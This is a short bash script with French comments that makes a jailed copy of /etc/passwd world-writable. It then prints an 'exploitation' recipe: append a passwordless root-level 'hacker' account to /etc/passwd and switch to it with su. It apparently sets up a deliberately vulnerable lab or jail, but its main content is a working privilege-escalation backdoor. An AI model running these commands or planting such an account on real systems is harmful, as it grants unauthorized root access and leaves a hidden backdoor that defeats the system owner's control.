#!/bin/bash
# Rend /etc/passwd modifiable

touch /home/jailed/etc/passwd
chmod 666 /home/jailed/etc/passwd

echo "✅ /etc/passwd est modifiable. Exploitation :
echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd
su hacker"
